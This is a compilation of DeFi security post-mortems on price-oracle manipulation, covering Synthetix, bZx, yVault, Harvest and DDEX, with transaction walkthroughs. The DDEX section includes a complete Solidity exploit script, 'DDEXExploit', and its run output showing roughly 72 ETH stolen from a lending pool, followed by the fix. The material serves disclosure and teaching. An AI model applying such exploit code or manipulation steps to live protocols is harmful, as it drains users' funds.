# Rekt

## Synthetix sKRW Oracle Malfunction

Synthetix is a derivatives platform which allows users to be exposed to assets such as other currencies. To facilitate this, **Synthetix \(at the time\) relied on a custom off-chain price feed implementation wherein an aggregate price calculated from a secret set of price feeds was posted on-chain at a fixed interval.** These prices then allowed users to take long or short positions against supported assets.

On June 25, 2019, one of the price feeds that Synthetix relied on mis-reported the price of the Korean Won to be 1000x higher than the true rate. Due to [additional errors](https://blog.synthetix.io/response-to-oracle-incident/) elsewhere in the price oracle system, this price was accepted by the system and posted on-chain, where **a trading bot quickly traded in and out of the sKRW market.** In total, the bot was able to earn a profit of over 1B USD, although the Synthetix team was able to negotiate with the trader to return the funds in exchange for a bug bounty.

Synthetix correctly implemented the oracle contract and pulled prices from multiple sources in order to prevent traders from predicting price changes before they were published on-chain. However, an isolated case of one upstream price feed malfunctioning resulted in a devastating attack. This illustrates the risk of using a price oracle which uses off-chain data: you don't know how the price is calculated, so your system must be carefully designed such that all potential failure modes are handled properly.

##  Synthetix MKR Manipulation

In December 2019, Synthetix suffered another attack as a result of price oracle manipulation. What’s notable about this one is that it crossed the barrier between on-chain price data and off-chain price data.

Reddit user u/MusaTheRedGuard [observed](https://www.reddit.com/r/ethfinance/comments/eexbfa/daily_general_discussion_december_24_2019/fby3i6n/) that an attacker was making some very suspicious trades against sMKR and iMKR \(inverse MKR\). The attacker first purchased a long position on MKR by buying sMKR, then purchased large quantities of MKR from the Uniswap ETH/MKR pair. After waiting a while, the attacker sold their sMKR for iMKR and sold their MKR back to Uniswap. They then repeated this process.

Behind the scenes, the attacker’s trades through Uniswap allowed them to move the price of MKR on Synthetix at will. This was likely because **the off-chain price feed that Synthetix relied on was in fact relying on the on-chain price of MKR,** and there wasn’t enough liquidity for arbitrageurs to reset the market back to optimal conditions.

![](../../.gitbook/assets/image%20%289%29.png)

This incident illustrates the fact that even if you think you’re using off-chain price data, you may still actually be using on-chain price data and you may still be exposed to the intricacies involved with using that data.

## bZx First Hack

This is about the transaction [0xb5c8…](https://oko.palkeo.com/0xb5c8bd9430b6cc87a0e2fe110ece6bf527fa4f170a4bc8cd032f768fc5219838/), that was mined on Saturday 15th February 2020 at 01:38:57 UTC.

In that transaction an attacker used a flaw in bZx/Fulcrum to take an under-collateralized position, resulting in approximately 370k$ worth of profit for them, and approximately 620k$ of equity loss in the bZx lending pool.

Let’s see why there was a vulnerability, and how it wasn’t an oracle bug. We will source every claim with links to the original transaction.

### High-level overview

To see what happened, we can use either [Oko](https://oko.palkeo.com/0xb5c8bd9430b6cc87a0e2fe110ece6bf527fa4f170a4bc8cd032f768fc5219838/) or [EthDecoder](http://ethtx.info/mainnet/0xb5c8bd9430b6cc87a0e2fe110ece6bf527fa4f170a4bc8cd032f768fc5219838). Both let us see the tree of all the calls made during that transaction. Beware: that transaction is fairly complex.

Here are the main calls that happened during it:

> 1. The attacker borrows 10000 ETH from DyDx.
> 2. The attacker sends 5500 ETH to Compound, and borrows 112 WBTC.
> 3. The attacker sends 1300 ETH to bZx to open a 5x short position for WBTC.
>    * bZx internally converts 5637 ETH to 51 WBTC through a Kyber order routed to Uniswap \(huge spread\).
> 4. The attacker converts the 112 WBTC \(borrowed at B.\) to 6871 ETH on Uniswap \(because the prices got skewed at C.\)
> 5. The attacker sends back the 10000 ETH to DyDx.
> 6. The attacker ends up with 71 ETH, then do a little obfuscation dance \(see below\) and sends 65 ETH to the attacker originating EOA.

Note

No, they didn’t make 71 ETH of “pure arbitrage profit”. They ended up the transaction with a Compound position having 5500 ETH of collateral and only 112 wBTC borrowed. This is around 350k$ worth of equity in Compound.

### Why the transaction is suspicious

Before we dive into the details, a few things to note:

> * The attacker-controlled address and contracts are new, and never interacted with bZx, Compound, or anything. So they obviously have zero balance everywhere.
> * All the attacker-deployed contracts, and the address used to invoke the transactions are funded by [0x296e…](https://etherscan.io/address/0x296e3345e3da85181ff279dd36e6054d73da3717). This address was funded by Tornado Cash \(an Ethereum mixer\), shortly before the attack. It seems like the attacker spent efforts on staying anonymous, so we cannot trace the funds further \(or we would need some probabilistic / taint analysis\).
> * At the [end of the transaction](https://oko.palkeo.com/0xb5c8bd9430b6cc87a0e2fe110ece6bf527fa4f170a4bc8cd032f768fc5219838/#call_1), the attacker contract creates another contract, sends 65 ETH to it only to immediately self-destruct it, so the money ends up to the EOA that the transaction originates from. This is a very contrived way of sending ETH to `tx.origin`. I’m not sure what the purpose of this is, but my best guess is it could be obfuscation, and/or a way to try to avoid frontrunning bots from frontrunning the attack transaction by making it harder to replay.

Most importantly, by quickly looking at it, you notice the origin account of the transaction starts with nothing, then borrows and moves a pile of cash, causes two huge Uniswap orders \(in both directions\) in the course of the same transaction, and ends up with 65 ETH. That definitely looks fishy.

### Walkthrough of the transaction

We will now go over each of these actions to try clarifying what happened.

#### **A. The DyDx instant borrow**

How did they get enough liquidity to pull off their attack?

The `operate()` function of Dydx Solo contract is called by a second attacker contract [0x0d…](https://oko.palkeo.com/0x0de0dD63d9fB65450339ef27577d4f39d095EB85/): [call here](https://oko.palkeo.com/0xb5c8bd9430b6cc87a0e2fe110ece6bf527fa4f170a4bc8cd032f768fc5219838/#call_0_0).

This single `operate()` call contains two successive actions:

> * First, a `ActionType.Withdraw` of 10000 ETH, to the first attacker contract.
> * Second, a `ActionType.Call` to the first attacker contract.

What happens here is that DyDx only checks if you have collateral when all the operations you wanted to do are finished. But if you do everything atomically you don’t need a collateral!

Note that the whole exploit will happen inside of the `Call` action that’s initiated from DyDx. The attacker is going to withdraw the funds they borrowed from DyDx, pull off the exploit, then put the funds back. At the end their account doesn’t have have any debt, so there is no under-collateralization and DyDx doesn’t revert the call.

This is the easy part that gets the 10k ETH needed to do the exploit.

#### **B. The Compound borrow**

Like the DyDx borrow, this is only a step used to convert the borrowed ETH to enough WBTC so they can pull off the attack.

This happens in two calls:

> 1. [mint\(\)](https://oko.palkeo.com/0xb5c8bd9430b6cc87a0e2fe110ece6bf527fa4f170a4bc8cd032f768fc5219838/#call_0_0_0_3_0_2) to send the collateral to Compound.
> 2. [borrow\(\)](https://oko.palkeo.com/0xb5c8bd9430b6cc87a0e2fe110ece6bf527fa4f170a4bc8cd032f768fc5219838/#call_0_0_0_3_0_4) to use the account to borrow the 112 WBTC.

For the curious, the actual WBTC transfer inside of `borrow()` happens [here](https://oko.palkeo.com/0xb5c8bd9430b6cc87a0e2fe110ece6bf527fa4f170a4bc8cd032f768fc5219838/#call_0_0_0_3_0_4_4).

#### **C. bZx position opening**

[This call](https://oko.palkeo.com/0xb5c8bd9430b6cc87a0e2fe110ece6bf527fa4f170a4bc8cd032f768fc5219838/#call_0_0_0_3_0_6) opens a Fulcrum position, shorting ETH against WBTC with a x5 leverage. This position is on 1300 ETH \(huge\).

Internally, bZx uses Kyber to determine the mid-price for the tokens involved in the position \(it averages the price from both directions: [call 1](https://oko.palkeo.com/0xb5c8bd9430b6cc87a0e2fe110ece6bf527fa4f170a4bc8cd032f768fc5219838/#call_0_0_0_3_0_6_0_1_0), [call 2](https://oko.palkeo.com/0xb5c8bd9430b6cc87a0e2fe110ece6bf527fa4f170a4bc8cd032f768fc5219838/#call_0_0_0_3_0_6_0_1_1)\). The prices it gets are all representing the correct market prices. As [this tweet](https://twitter.com/bzxHQ/status/1228704760020127744) also points out, Uniswap is not used as a price feed.

#### **The slippage risk**

However, when you open a position like this, it needs to convert these 1300 ETH multiplied by the leverage, to WBTC, which becomes your collateral.

The conversion is sent through Kyber. Kyber queries each reserve, but no reserve seems to have enough liquidity to fulfill that order alone, except for Uniswap. [So the order is routed to Uniswap](https://oko.palkeo.com/0xb5c8bd9430b6cc87a0e2fe110ece6bf527fa4f170a4bc8cd032f768fc5219838/#call_0_0_0_3_0_6_0_5_0_5_0_2_2_3_7).

For such a huge volume, going through Uniswap skews the price a lot: bZx sends 5637 ETH, receives 51 WBTC. That’s 110 BTC/ETH where the normal price is closer to 36 BTC/ETH!

This is normally fine, as the position is overcollateralized by at least 20%, so you would need a slippage bigger than that to cause a problem. But here it was the case, so the slippage caused a loss that ate into the lending pool.

#### **The bZx bug**

However, this seems to be an intentional design: the code also makes sure that the caller account is fully collateralized after everything is finished. If it is not, the call should revert.

So if there is a huge loss caused by slippage, the caller would not have enough collateral and the call would revert. This makes sense, and other contracts like DyDx have a similar design \(see above\).

It is supposed to be enforced [by this code](https://github.com/bZxNetwork/bZx-monorepo/blob/feb34f7c6e4e1aac8691408f4a6ecde9bf22b715/packages/contracts/contracts/modules/iTokens_loanOpeningFunctions.sol#L148) that the position is still collateralized enough:

```text
require ((
         loanDataBytes.length == 0 && // Kyber only
         sentAmounts[6] == sentAmounts[1]) || // newLoanAmount
   !OracleInterface(oracle).shouldLiquidate(
         loanOrder,
         loanPosition
   ),
   "unhealthy position"
);
```

But because of a logic bug, the first part of that condition is true and the `shouldLiquidate()` is never called \(you can check in the trace\). So when the call should have reverted, it didn’t.

Lev Livnev has a [more detailed writeup](https://lev.liv.nev.org.uk/pub/bzx_debug.txt) of the call stack that leads to that bug.

#### **Effect on bZx pool**

After that transaction, bZx has:

> * [+51](https://oko.palkeo.com/0xb5c8bd9430b6cc87a0e2fe110ece6bf527fa4f170a4bc8cd032f768fc5219838/#call_0_0_0_3_0_6_0_5_0_5_0_2_2_3_7_0_0_1) WBTC
> * [+1300](https://oko.palkeo.com/0xb5c8bd9430b6cc87a0e2fe110ece6bf527fa4f170a4bc8cd032f768fc5219838/#call_0_0_0_3_0_6_0_5_0) [-5637](https://oko.palkeo.com/0xb5c8bd9430b6cc87a0e2fe110ece6bf527fa4f170a4bc8cd032f768fc5219838/#call_0_0_0_3_0_6_0_5_0_5_0_2_2_3_7_0_0) = -4337 ETH

So this transaction caused a loss of equity of around 620000$ in bZx.

This is an outside view. From the perspective of bZx, the attacker converted their 1300 ETH into 51 WBTC of collateral \(bug\), and also left 360 ETH as escrowed interest. You can refer to their official post-mortem to learn more about that and how it should affect the people who put loans in the pool.

#### **D. The Uniswap arbitrage**

At the previous step C., the attacker exploited a bug in bZx that caused it to trade a huge amount on Uniswap, at a 3x inflated price.

Because of the way Uniswap works, this caused a big price swing in the price of the WBTC pool. This distorted price can then be arbitraged back to the normal price, for a profit.

This is what they do: [they arbitrage against Uniswap](https://oko.palkeo.com/0xb5c8bd9430b6cc87a0e2fe110ece6bf527fa4f170a4bc8cd032f768fc5219838/#call_0_0_0_3_0_8_0) by selling the 112 WBTC they borrowed from Compound \(step B.\) on Uniswap. Because the Uniswap supply is all distorted, they are able to sell these 112 WBTC for 6871 ETH.

This is a price of 61 BTC/ETH: they are selling their 112 WBTC at twice the market price.

#### **E & F. Settling everything**

Now they have enough ETH to [refund their borrowed DyDx Ethers](https://oko.palkeo.com/0xb5c8bd9430b6cc87a0e2fe110ece6bf527fa4f170a4bc8cd032f768fc5219838/#call_0_0_0_3_0_11), and they have 65 ETH of leftovers that they [send back](https://oko.palkeo.com/0xb5c8bd9430b6cc87a0e2fe110ece6bf527fa4f170a4bc8cd032f768fc5219838/#call_1_2_0) to the account that sent the transaction.

Again, note that they didn’t make 65 ETH of profit. This is only the breadcrumbs, as the biggest chunk of the profit is in the Compound position that they opened.

#### **Summary**

As we have seen, DyDx and Compound are only here to get enough leverage. And it’s the position that the attacker took on bZx that caused a huge Uniswap skewing that they then exploited.

Also note that the attacker only opened a position, and that’s it. There were not fiddling with the Uniswap prices first, or anything like that.

It’s the mere fact of opening their huge position that caused a leak of funds from bZx to Uniswap, that they exploited.

#### The aftermath

**Attacker: repaying the Compound position**

After that transaction, the [first attacker smart contract](https://oko.palkeo.com/0x4f4e0f2cb72E718fC0433222768c57e823162152/) ends up with a Compound account with more than 300k$ of equity, made of:

> * 1430000$ worth of collateralized ETH: +5500 ETH
> * 1009000$ worth of WBTC debt: -112 WBTC

However, they cannot withdraw their ETH directly, or their account would end up under-collateralized. So they need to buy WBTC on the market, pay off their debt and withdraw their ETH.

Guess what? That’s exactly what they have been doing. Precisely two hours after their exploit transaction they started to buy WBTC and [repay their loan](https://etherscan.io/address/0x4f4e0f2cb72E718fC0433222768c57e823162152#loans).

[This is an example transaction](https://oko.palkeo.com/0x136fab28b0d107406e75ebb23dde48d5c4be7da2f7e04468292fe3496cfe7dde/) where they repay their loan. This feature is part or their smart contract.

It took them a bit less than two days to fully repay their positions. They sent all the fund to [their EOA](https://etherscan.io/address/0x148426fdc4c8a51b96b4bed827907b5fa6491ad0), which now has 1193 ETH.

#### **A feast for the arbitrage bots**

You probably noticed that the equity loss from bZx and the money the attacker made don’t add up.

It happens that the attacker possibly didn’t maximize their profit, and they left Uniswap completely unbalanced after their attack. A lot of bots then rushed to make a profit out of it.

Two examples:

> * [This arbitrage transaction](https://oko.palkeo.com/0x6ae8e21f8ab094df3f3e7c3f644c4f56e071b89618c0318add7a8799ccd6e5c6/) made a profit of 315 ETH \(see the balance change of the contract 0xb958…\).
> * [This other transaction](https://oko.palkeo.com/0xc0f851da35f752c0fd300404324fad434076567432e1a7df37ae4df480f5f71d/) made a profit of 9 ETH.
> * There is a lot more: you can see the list [here \(page 23\)](https://bloxy.info/txs/events_sc/0x4d2f5cfba55ae412221182d8475bc85799a5644b?from=2020-02-15&signature_id=12727&till=2020-02-15).

#### **Bonus findings**

#### **Even the attacker makes mistakes**

When withdrawing money, they always have their contract create a temporary contract that self-destruct itself immediately \(see above\). And they specify the amount of Ether they want to withdraw.

[See here for an example](https://oko.palkeo.com/0x798aeb81f16d7b9d69f6d311264963efff6251598a4fa518948de30a823d7351/). However this example was their second try!

First [they failed](https://oko.palkeo.com/0xcefbfd3f3003bd8cc8a82ac27d01b9b4d076b7c8db08c6b3b7f7c02b89b6423b/), because instead of passing 10.1×1018 Wei, they passed 10.1×1018×1018 \(they multiplied the amount in Wei twice by 1018\). So obviously this was a ridiculously high amount and it didn’t work.

This is a very small mistake without consequences, but it was interesting to see.

**Possibly related contract**

The [self-destructing contracts](https://oko.palkeo.com/0xbeBb19bda59AB9e5b444018114ca37e82bbd93FC/code/) that the attacker was using have an unknown function selector, for the function that triggers the self-destruct: `0xf2adf1cb`.

We don’t know what’s the original name. However we can find [this contract](https://oko.palkeo.com/0xb68605A705A60Ca85927c7dB237457D8B63d9809/code/) that is from 2+ years ago, but seems to do something very similar, and has that same function selector! It’s the [only one](https://bloxy.info/functions/f2adf1cb) on mainnet.

There is no way to tell if this was related, or if it’s just a coincidence. But it’s worth considering.

## bZx Second Hack

By relying on an on-chain decentralized price oracle without validating the rates returned, [DDEX](https://margin.ddex.io/) and [bZx](https://bzx.network/) were susceptible to atomic price manipulation. This would have resulted in the loss of liquid ETH in the ETH/DAI market for DDEX, and loss of all liquid funds in bZx. Fortunately, no funds were actually lost.

In February 2020, bZx was hacked twice over the span of several days for approximately 1MM USD. You can find an excellent technical analysis of both hacks written by palkeo [here](https://www.palkeo.com/en/projets/ethereum/bzx.html), but we will only be looking at the second hack.

In the second hack, the attacker first purchased nearly all of the sUSD on Kyber using ETH. Then, the attacker purchased a second batch of sUSD from Synthetix itself and deposited it on bZx. Using the sUSD as collateral, the attacker borrowed the maximum amount of ETH they were allowed to. They then sold back the sUSD to Kyber.

If you’ve been paying attention, you’ll recognize this as essentially the same undercollateralized loan attack, but using a different collateral and a different decentralized exchange.

## yVault Bug

On July 25, 2020, I reported a bug to yEarn regarding the launch of their new yVault contracts. You can read the official writeup about this bug [here](https://blog.trailofbits.com/2020/08/05/accidentally-stepping-on-a-defi-lego/), but I will briefly summarize it below.

The yVault system allows users to deposit a token and earn yield on it without needing to manage it themselves. Internally, the vault tracks the total amount of yVault tokens minted as well as the total amount of underlying tokens deposited. **The worth of a single yVault token is given by the ratio of tokens minted to tokens deposited.** Any yield the vault earns is spread across all minted yVault tokens \(and therefore, across all yVault token holders\).

The first yVault allowed users to earn yield on USDC by supplying liquidity to the Balancer MUSD/USDC pool. When a user supplies liquidity to Balancer pools, they receive BPT in return which can be redeemed for a proportion of the pool. As such, **the yVault calculated the value of its holdings based on the amount of MUSD/USDC which could be redeemed with its BPT.**

This seems like the correct implementation, but unfortunately the same principle as given before applies - **the state of the Balancer pool during a transaction is not stable and cannot be trusted**. In this case, because of the bonding curve that Balancer chose, a user who swaps between from USDC to MUSD will not receive a 1:1 exchange rate, but will in fact leave behind some MUSD in the pool. This means that the value of BPT can be temporarily inflated, which allows an attacker to manipulate the price at will and subsequently drain the vault.

![](https://samczsun.com/content/images/2020/11/image-30.png)

This incident shows that price oracles are not always conveniently labelled as such, and that developers need to be vigilant about what sort of data they’re ingesting and consider whether that data can be easily manipulated by an unprivileged user.

Figure 1 presents the equation used to calculate the amount of tokens received based on the state of the Balancer pool and the amount of tokens sent. For the remainder of this post, let’s refer to the MUSD/USDC 50/50 pool. The swap fee is 0.05%.

| 12345678910 | `/**********************************************************************************************// calcOutGivenIn                                                                            //// aO = tokenAmountOut                                                                       //// bO = tokenBalanceOut                                                                      //// bI = tokenBalanceIn              /      /            bI             \    (wI / wO) \      //// aI = tokenAmountIn    aO = bO * |  1 - | --------------------------  | ^            |     //// wI = tokenWeightIn               \      \ ( bI + ( aI * ( 1 - sF )) /              /      //// wO = tokenWeightOut                                                                       //// sF = swapFee                                                                              //**********************************************************************************************/` |
| :--- | :--- |


Figure 1: Token output given input.

First, to get a sense of how this function behaves, we’ll see what happens when a rational market actor swaps a pool back into balance and when an irrational market actor swaps a pool out of balance.

Suppose the pool is currently out of balance and contains 1,100,000 USDC and 900,000 MUSD. If a rational market actor pays 90,000 MUSD, they’ll receive 99,954 USDC in exchange and make 9,954 USDC in profit. A very good deal!

Now suppose the pool is currently balanced and contains 1,000,000 USDC and 1,000,000 MUSD. What happens if an irrational market actor pays 100,000 USDC? Well, they would receive 90,867 MUSD for a loss of 9,133 MUSD. Not such a great deal.

Although the second trade results in an immediate loss and thus seems rather useless, pairing it with the first trade results in some interesting behavior.

Consider a user who first performs The Bad Trade: The user converts 100,000 USDC to 90,867 MUSD, losing 9,133 USD in the process. Then, the user performs The Good Trade and converts 90,867 MUSD to 99,908 USDC, earning 9,041 USD in the process. This results in a net loss of 92 USD. Not ideal, but certainly not as bad as the loss of 9,200 USD.

Now consider the valuation of BPT during this process. If you held 1% of the total BPT, at the start of the transaction your tokens would have been worth 1% of 2,000,000 USD, or 20,000 USD. At the end of the transaction, your tokens would have been worth 1% of 2,000,092 USD, or 20,000.96 USD. Yet for a magical moment, right in the middle of the transaction, your tokens were worth 1% of 2,009,133 USD, or 20,091.33 USD. This is the crux of the vulnerability at hand.

Knowing this, I applied the same process behavior to yVault. Before The Bad Trade, the vault holds some BPT worth some amount of USD. After The Good Trade, the vault holds the same amount of BPT worth a slightly larger amount of USD. However, between The Bad Trade and The Good Trade, the vault holds some BPT worth a significantly larger amount of USD.

Recall that the value of yUSDC is directly proportional to the value of the BPT it holds. If we bought yUSDC before The Bad Trade and sold yUSDC before The Good Trade, we would instantaneously make a profit. **Repeat this enough times, and we would drain the vault.**

### How was it fixed?

It turns out that accurately calculating the true value of BPT and preventing attackers from extracting profit from slippage is a difficult problem to solve. Instead, the developer, Andre, deployed a new strategy that simply converts USDC to MUSD and supplies it to the mStable savings account was deployed and activated.

## Harvest Finance Hack

On October 26, 2020, an unknown user hacked the Harvest Finance pools using a technique that you can probably guess by now. You can read the official post-mortem [here](https://medium.com/harvest-finance/harvest-flashloan-economic-attack-post-mortem-3cf900d65217), but once again I’ll summarize it for you: **the attacker deflated the price of USDC in the Curve pool by performing a trade, entered the Harvest pool at the reduced price, restored the price by reversing the earlier trade, and exited the Harvest pool at a higher price. This resulted in over 33MM USD of losses**

\*\*\*\*

## DDEX \(Hydro Protocol\) <a id="ddex-hydro-protocol-"></a>

DDEX is a decentralized exchange platform but are in the process of expanding into decentralized lending so that they can offer their users the ability to create leveraged long and short positions. They're currently beta testing their decentralized margin exchange.

On September 9th 2019, DDEX added DAI as an asset to their margin trading platform and enabled the ETH/DAI market. For the oracle, they specified [this](https://etherscan.io/address/0xeB1f1A285fee2AB60D2910F2786E1D036E09EAA8) smart contract which returns the value of DAI/USD by calculating `PriceOfETHInUSD/PriceOfETHInDAI`. The value of ETH/USD is read from the Maker oracle, while the value of ETH/DAI is read from either Eth2Dai, or if the spread is too great, Uniswap.

```javascript
function peek()
	public
	view
	returns (uint256 _price)
{
	uint256 makerDaoPrice = getMakerDaoPrice();

	if (makerDaoPrice == 0) {
		return _price;
	}

	uint256 eth2daiPrice = getEth2DaiPrice();

	if (eth2daiPrice > 0) {
		_price = makerDaoPrice.mul(ONE).div(eth2daiPrice);
		return _price;
	}

	uint256 uniswapPrice = getUniswapPrice();

	if (uniswapPrice > 0) {
		_price = makerDaoPrice.mul(ONE).div(uniswapPrice);
		return _price;
	}

	return _price;
}

function getEth2DaiPrice()
	public
	view
	returns (uint256)
{
	if (Eth2Dai.isClosed() || !Eth2Dai.buyEnabled() || !Eth2Dai.matchingEnabled()) {
		return 0;
	}

	uint256 bidDai = Eth2Dai.getBuyAmount(address(DAI), WETH, eth2daiETHAmount);
	uint256 askDai = Eth2Dai.getPayAmount(address(DAI), WETH, eth2daiETHAmount);

	uint256 bidPrice = bidDai.mul(ONE).div(eth2daiETHAmount);
	uint256 askPrice = askDai.mul(ONE).div(eth2daiETHAmount);

	uint256 spread = askPrice.mul(ONE).div(bidPrice).sub(ONE);

	if (spread > eth2daiMaxSpread) {
		return 0;
	} else {
		return bidPrice.add(askPrice).div(2);
	}
}

function getUniswapPrice()
	public
	view
	returns (uint256)
{
	uint256 ethAmount = UNISWAP.balance;
	uint256 daiAmount = DAI.balanceOf(UNISWAP);
	uint256 uniswapPrice = daiAmount.mul(10**18).div(ethAmount);

	if (ethAmount < uniswapMinETHAmount) {
		return 0;
	} else {
		return uniswapPrice;
	}
}

function getMakerDaoPrice()
	public
	view
	returns (uint256)
{
	(bytes32 value, bool has) = makerDaoOracle.peek();

	if (has) {
		return uint256(value);
	} else {
		return 0;
	}
}
```

[Source](https://github.com/HydroProtocol/protocol/blob/244b01ad323a7d0796ae2eda3b7b455a361dd376/contracts/oracle/DaiPriceOracle.sol#L89-L155)

In order to trigger an update and cause the oracle to refresh its stored value, a user simply has to call `updatePrice()`.

```javascript
function updatePrice()
	public
	returns (bool)
{
	uint256 _price = peek();

	if (_price != 0) {
		price = _price;
		emit UpdatePrice(price);
		return true;
	} else {
		return false;
	}
}
```

[Source](https://github.com/HydroProtocol/protocol/blob/244b01ad323a7d0796ae2eda3b7b455a361dd376/contracts/oracle/DaiPriceOracle.sol#L74-L87)

### The attack

Let's assume we can manipulate the apparent value of DAI/USD. If this is the case, we would like to use this to borrow all of the ETH in the system while providing as little DAI as possible. To achieve this, we can either lower the apparent value of ETH/USD or increase the apparent value of DAI/USD. Since we're already assuming that the apparent value of DAI/USD is manipulable, we'll choose the latter.

To increase the apparent value DAI/USD, we can either increase the apparent value of ETH/USD, or decrease the apparent value of ETH/DAI. For all intents and purposes manipulating Maker's oracle is impossible, so we'll try decreasing the apparent value of ETH/DAI.

The oracle will calculate the value of ETH/DAI as reported by Eth2Dai by taking the average of the current asking price and the current bidding price. In order to decrease this value, we'll need to lower the current bidding price by filling existing orders and then lower the current asking price by placing new orders.

However, this requires a significant initial investment \(as we need to fill orders then make an equivalent number of orders\) and is non-trivial to implement. On the other hand, we can drop the Uniswap price simply by selling a large amount of DAI to Uniswap. As such, we'll aim to bypass the Eth2Dai logic and manipulate the Uniswap price.

In order to bypass Eth2Dai, we need to manipulate the magnitude of the spread. We can do this in one of two ways:

1. Clear out one side of the orderbook while leaving the other alone. This causes spread to increase positively
2. Force a crossed orderbook by listing an extreme buy or sell order. This causes spread to decrease negatively.

While option 2 would result in no losses from taking unfavorable orders, the use of SafeMath disallows a crossed orderbook and as such is unavailable to us. Instead, we'll force a large positive spread by clearing out one side of the orderbook. This will cause the DAI oracle to fallback to Uniswap to determine the price of DAI. Then, we can cause the Uniswap price of DAI/ETH to drop by buying a large amount of DAI. Once the apparent value of DAI/USD has been manipulated, it's trivial to take out a loan like as usual.

#### Demo <a id="demo"></a>

The following script will turn a profit of approximately 70 ETH by:

1. Clearing out Eth2Dai's sell orders until the spread is large enough that the oracle rejects the price
2. Buying more DAI from Uniswap, dropping the price from 213DAI/ETH to 13DAI/ETH
3. Borrowing all the available ETH \(~120\) for a small amount of DAI \(~2500\)
4. Selling the DAI we bought from Uniswap back to Uniswap
5. Selling the DAI we bought from Eth2Dai back to Eth2Dai
6. Resetting the oracle \(don't want anyone else abusing our favorable rates\)

```javascript
contract DDEXExploit is Script, Constants, TokenHelper {
    OracleLike private constant ETH_ORACLE = OracleLike(0x8984F1CFf1d614a7404b0cfE97C6fa9110b93Bd2);
    DaiOracleLike private constant DAI_ORACLE = DaiOracleLike(0xeB1f1A285fee2AB60D2910F2786E1D036E09EAA8);
    
    ERC20Like private constant HYDRO_ETH = ERC20Like(0x000000000000000000000000000000000000000E);
    HydroLike private constant HYDRO = HydroLike(0x241e82C79452F51fbfc89Fac6d912e021dB1a3B7);
    
    uint16 private constant ETHDAI_MARKET_ID = 1;
    
    uint private constant INITIAL_BALANCE = 25000 ether;
    
    function setup() public {
        name("ddex-exploit");
        blockNumber(8572000);
    }
    
    function run() public {
        begin("exploit")
            .withBalance(INITIAL_BALANCE)
            .first(this.checkRates)
            .then(this.skewRates)
            .then(this.checkRates)
            .then(this.steal)
            .then(this.cleanup)
            .then(this.checkProfits);
    }
    
    function checkRates() external {
        uint ethPrice = ETH_ORACLE.getPrice(HYDRO_ETH);
        uint daiPrice = DAI_ORACLE.getPrice(DAI);
        
        printf("eth=%.18u dai=%.18u\n", abi.encode(ethPrice, daiPrice));
    }
    
    uint private boughtFromMatchingMarket = 0;
    
    function skewRates() external {
        skewUniswapPrice();
        skewMatchingMarket();
        require(DAI_ORACLE.updatePrice());
    }
    
    function skewUniswapPrice() internal {
        DAI.getFromUniswap(DAI.balanceOf(address(DAI.getUniswapExchange())) * 75 / 100);
    }
    
    function skewMatchingMarket() internal {
        uint start = DAI.balanceOf(address(this));
        WETH.deposit.value(address(this).balance)();
        WETH.approve(address(MATCHING_MARKET), uint(-1));
        while (DAI_ORACLE.getEth2DaiPrice() != 0) {
            MATCHING_MARKET.buyAllAmount(DAI, 5000 ether, WETH, uint(-1));
        }
        boughtFromMatchingMarket = DAI.balanceOf(address(this)) - start;
        WETH.withdrawAll();
    }
    
    function steal() external {
        HydroLike.Market memory ethDaiMarket = HYDRO.getMarket(ETHDAI_MARKET_ID);
        HydroLike.BalancePath memory commonPath = HydroLike.BalancePath({
            category: HydroLike.BalanceCategory.Common,
            marketID: 0,
            user: address(this)
        });
        HydroLike.BalancePath memory ethDaiPath = HydroLike.BalancePath({
            category: HydroLike.BalanceCategory.CollateralAccount,
            marketID: 1,
            user: address(this)
        });
        
        uint ethWanted = HYDRO.getPoolCashableAmount(HYDRO_ETH);
        uint daiRequired = ETH_ORACLE.getPrice(HYDRO_ETH) * ethWanted * ethDaiMarket.withdrawRate / DAI_ORACLE.getPrice(DAI) / 1 ether + 1 ether;
        
        printf("ethWanted=%.18u daiNeeded=%.18u\n", abi.encode(ethWanted, daiRequired));
        
        HydroLike.Action[] memory actions = new HydroLike.Action[](5);
        actions[0] = HydroLike.Action({
            actionType: HydroLike.ActionType.Deposit,
            encodedParams: abi.encode(address(DAI), uint(daiRequired))
        });
        actions[1] = HydroLike.Action({
            actionType: HydroLike.ActionType.Transfer,
            encodedParams: abi.encode(address(DAI), commonPath, ethDaiPath, uint(daiRequired))
        });
        actions[2] = HydroLike.Action({
            actionType: HydroLike.ActionType.Borrow,
            encodedParams: abi.encode(uint16(ETHDAI_MARKET_ID), address(HYDRO_ETH), uint(ethWanted))
        });
        actions[3] = HydroLike.Action({
            actionType: HydroLike.ActionType.Transfer,
            encodedParams: abi.encode(address(HYDRO_ETH), ethDaiPath, commonPath, uint(ethWanted))
        });
        actions[4] = HydroLike.Action({
            actionType: HydroLike.ActionType.Withdraw,
            encodedParams: abi.encode(address(HYDRO_ETH), uint(ethWanted))
        });
        DAI.approve(address(HYDRO), daiRequired);
        HYDRO.batch(actions);
    }
    
    function cleanup() external {
        DAI.approve(address(MATCHING_MARKET), uint(-1));
        MATCHING_MARKET.sellAllAmount(DAI, boughtFromMatchingMarket, WETH, uint(0));
        WETH.withdrawAll();
        
        DAI.giveAllToUniswap();
        require(DAI_ORACLE.updatePrice());
    }
    
    function checkProfits() external {
        printf("profits=%.18u\n", abi.encode(address(this).balance - INITIAL_BALANCE));
    }
}

/*
### running script "ddex-exploit" at block 8572000
#### executing step: exploit
##### calling: checkRates()
eth=213.440000000000000000 dai=1.003140638067989051
##### calling: skewRates()
##### calling: checkRates()
eth=213.440000000000000000 dai=16.058419875880325580
##### calling: steal()
ethWanted=122.103009983203364425 daiNeeded=2435.392672403537525078
##### calling: cleanup()
##### calling: checkProfits()
profits=72.140629996890984407
#### finished executing step: exploit
*/
```

#### Solution <a id="solution"></a>

The DDEX team fixed this by deploying a [new oracle](https://etherscan.io/address/0xe6f148448b61339a59ef6ab9ab7378e9200fa745) which places sanity bounds on the price of DAI, currently set to `0.95` and `1.05`.

```javascript
function updatePrice()
	public
	returns (bool)
{
	uint256 _price = peek();

	if (_price == 0) {
		return false;
	}

	if (_price == price) {
		return true;
	}

	if (_price > maxPrice) {
		_price = maxPrice;
	} else if (_price < minPrice) {
		_price = minPrice;
	}

	price = _price;
	emit UpdatePrice(price);

	return true;
}
```

